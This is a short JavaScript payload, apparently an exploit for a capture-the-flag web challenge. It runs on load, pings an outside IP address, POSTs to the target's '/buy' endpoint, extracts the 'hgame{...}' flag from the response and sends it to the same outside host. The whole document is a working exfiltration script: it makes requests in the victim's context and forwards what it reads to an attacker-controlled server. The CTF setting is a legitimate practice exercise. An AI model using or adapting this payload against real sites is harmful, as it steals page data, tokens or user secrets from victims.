!(function(){
  fetch("http://124.222.247.149:20323/receive?token=lelecha")
  // const baseTag= document.getElementById("d");
  // baseTag.parentElement.removeChild(baseTag);
  const mySearchParams1 = new URLSearchParams("?id=0");
  fetch("/buy",{
    method:"POST",
    body:mySearchParams1,
  }).then((res)=>{
    return res.text();
  }).then((text)=>{
    const matchObj= text.match("hgame{.+}");
    const flag= encodeURIComponent(matchObj[0]);
    fetch(`http://124.222.247.149:20323/receive?token=${flag}`);
  })
})()
